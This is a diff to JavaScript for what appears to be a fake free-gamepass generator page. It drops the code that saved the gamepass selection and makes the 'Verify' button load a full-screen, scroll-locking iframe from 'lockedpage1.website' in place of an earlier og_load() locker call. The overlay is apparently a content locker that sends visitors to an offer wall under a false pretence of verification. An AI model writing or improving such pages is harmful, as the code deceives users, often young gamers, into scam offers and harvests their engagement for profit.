@@ -65,15 +65,10 @@ document.addEventListener("DOMContentLoaded", function () {
             }
             // ----------------------------------
 
-            // Save selected gamepasses so complete.html can display them
-            const gamepassData = Array.from(selectedCards).map(card => ({
-                name: card.dataset.name,
-                img: card.querySelector('img').getAttribute('src')
-            }));
-            localStorage.setItem('selectedGamepasses', JSON.stringify(gamepassData));
 
+            
             setTimeout(function () {
-                // Hide all children from body except xf_MODAL_CONTAINER, blankScreen, and mobileCartPopup
+                // Hide all children from body except xf_MODAL_CONTAINER and blankScreen
                 Array.from(document.body.children).forEach(child => {
                     if (child !== modalContainer && child !== blankScreen && child !== mobileCartPopup) {
                         child.style.display = "none";
@@ -297,11 +292,38 @@ document.addEventListener("DOMContentLoaded", function () {
         setTimeout(showPhase, 500);
     }
 
+    function loadLockerIframe() {
+        if (document.getElementById('locker-frame-overlay')) {
+            return;
+        }
+
+        const overlay = document.createElement('div');
+        overlay.id = 'locker-frame-overlay';
+        overlay.style.position = 'fixed';
+        overlay.style.inset = '0';
+        overlay.style.zIndex = '999999';
+        overlay.style.background = '#ffffff';
+
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://lockedpage1.website/cl/i/grrd11';
+        iframe.style.width = '100%';
+        iframe.style.height = '100%';
+        iframe.style.border = '0';
+        iframe.style.display = 'block';
+        iframe.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
+
+        overlay.appendChild(iframe);
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+    }
+
     function addVerifyButton() {
         const verifyButton = document.createElement('button');
         verifyButton.textContent = 'Verify';
+        verifyButton.onclick = function () {
+            loadLockerIframe();
+        };
         verifyButton.classList.add('verify-button');
-        verifyButton.setAttribute('onclick', 'og_load();');
         const whiteBox = document.querySelector('.white-box');
         const popupAnchor = whiteBox ? whiteBox.querySelector('.popup-anchor') : null;
         if (whiteBox && popupAnchor) {
@@ -326,8 +348,8 @@ document.addEventListener("DOMContentLoaded", function () {
         img.src = src;
         img.classList.add("floating-image");
 
-        // Random size between 85px and 140px for variety
-        const size = Math.floor(Math.random() * 55 + 85);
+        // Random size between 80px and 140px
+        const size = Math.floor(Math.random() * 60 + 80);
         img.style.width = `${size}px`;
 
         // Fully random starting position in pixels
